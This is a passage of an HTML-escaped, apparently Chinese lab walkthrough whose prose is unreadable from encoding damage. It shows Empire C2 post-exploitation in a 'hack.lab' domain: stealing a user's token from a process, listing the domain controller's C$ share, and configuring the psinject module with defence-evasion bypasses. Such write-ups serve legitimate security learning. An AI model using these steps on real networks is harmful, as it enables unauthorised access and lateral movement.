&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2676&lt;/span&gt;  svchost        x64   NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM           5.37 MB   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;m&#34;&gt;2772&lt;/span&gt;  taskhost       x64   HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser                 9.01 MB   
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°&lt;code&gt;testuser&lt;/code&gt;æœ‰ä¸ªè¿›ç¨‹ä¸ºcmdä¸”pidä¸º&lt;code&gt;1888&lt;/code&gt;çš„è¿›ç¨‹ï¼Œæˆ‘ä»¬ä½¿ç”¨è¯¥è¿›ç¨‹è¿›è¡Œåˆ©ç”¨,å¯ä»¥çœ‹åˆ°å’Œåˆšæ‰ä½¿ç”¨pthçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; steal_token &lt;span class=&#34;m&#34;&gt;1888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7SU3EWKV to run Task &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Running As: HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-TokenManipulation completed!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Use credentials/tokens with RevToSelf option to revert token privileges
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; shell
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Exit Shell Menu with Ctrl+C
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;c92n &amp;gt; dir &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;dc.hack.lab&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;$
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mode&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;d--hs-&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Owner&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;NT AUTHORITY\\SYSTEM&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;LastWriteTime&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;\/Date(1642570875809)\/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;length&amp;#34;&lt;/span&gt;:  null,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Recycle&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Bin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mode&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;d--h--&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Owner&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;BUILTIN\\Administrators&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;LastWriteTime&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;\/Date(1642491461599)\/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;length&amp;#34;&lt;/span&gt;:  null,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$WINDOWS&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.~BT&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mode&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;d--hsl&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Owner&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;NT AUTHORITY\\SYSTEM&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;LastWriteTime&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;\/Date(1642396243258)\/&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;length&amp;#34;&lt;/span&gt;:  null,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Name&amp;#34;&lt;/span&gt;:  &lt;span class=&#34;s2&#34;&gt;&amp;#34;Documents and Settings&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ä¼šè¯æ³¨å…¥&#34;&gt;ä¼šè¯æ³¨å…¥&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªè·Ÿä¸Šé¢çš„è¿›ç¨‹æ³¨å…¥å·®ä¸å¤šï¼Œåªæ˜¯æ³¨å…¥è¿™ä¸ªè¿›ç¨‹åä¼šæ–°å»ºä¸€ä¸ªä¼šè¯è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨&lt;code&gt;psinject&lt;/code&gt;æ¨¡å—è¿›è¡Œæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7SU3EWKV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/management/psinject
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to 7SU3EWKV
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @sixdub                                                                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              leechristensen &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@tifkin_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     http://sixdub.net                                                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              which executes PS codefrom memory in a remote process. ProcID or       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              ProcName must be specified.                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/management/psinject                                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1055                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value              â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 7SU3EWKV           â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚                    â”‚ True     â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False              â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;        â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProcId           â”‚                    â”‚ False    â”‚ ProcessID to inject into.           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProcName         â”‚                    â”‚ False    â”‚ Process name to inject into.        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Proxy            â”‚ default            â”‚ False    â”‚ Proxy to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ none, or other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ProxyCreds       â”‚ default            â”‚ False    â”‚ Proxy credentials                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username:password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserAgent        â”‚ default            â”‚ False    â”‚ User-agent string to use &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ staging request &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;default, none, or  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                    â”‚          â”‚ other&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/management/psinject&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
